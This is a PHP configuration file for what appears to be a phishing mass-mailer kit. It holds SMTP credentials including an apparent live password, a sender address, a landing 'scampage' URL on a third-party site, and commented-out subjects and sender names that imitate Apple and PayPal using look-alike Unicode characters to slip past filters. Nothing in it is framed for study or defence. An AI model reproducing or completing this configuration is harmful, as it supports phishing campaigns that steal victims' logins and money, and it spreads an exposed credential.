<?php
//include('Gx.function.php');
//Regards
date_default_timezone_set('America/New_York');
$date = date('F d, Y, h:i A T');

$randip       = "" . rand(1, 200) . "." . rand(1, 200) . "." . rand(1, 100) . "." . rand(1, 300) . "";
/*function nomer($randstr)
{
    $char = '0123456789';
    $str  = '';
    for ($i = 0;
        $i < $randstr;
        $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;

};
function cok($randstr){
    $char = '1234567890';
    $str  = '';
    for ($i = 0;$i < $randstr;$i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
} */

function cok($length){
  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return substr (str_shuffle ($chars),0,$length);
}
function nomer($length){
  $chars = '0123456789';
  return substr (str_shuffle ($chars),0,$length);
}

/* Features SETUP */
$smtp_acc = [
    [
        "host"     => "smtp.mailgun.org",
        "port"     => "587",
        "username" => "support@escobarteam.me",
        "password" => "f9f6cc4a4b9dab8cabdd2ddbf72cb67c-76f111c4-ed9a7b33"
    ] 
    
];

//print "mеmbeг".cok(1)."".nomer(2)."".RandString(1)."@ρауρаl.сοm";
$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 3,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "",
    "fromname"       => "",
    "frommail"       => "support@escobarteam.me",
  //  "subject"        => "Re: Unuѕual sіgn-in actіvіty wіth yоur Αpρle ID ###randstring##".RandString(8)."",
    "subject"        => "Bapakkau Rohit #".nomer(5)."",
    "msgfile"        => "file/letter/bcc.txt",
    //"filepdf"        => "file/attachment/apple.html",
    "scampage"       => ["https://webophil.net/images/register.php?id=".RandString(50).""],
    ];
//http://karykaty.com.br/a.php?##email##=".RandString(23)."
//crechemundodossonhos.com.br

$fname = array(
	'Bapakkau pecah'
);
  //  'ΡауΡаl Rесονегу',
//    'Rесονегу ΡауΡаl',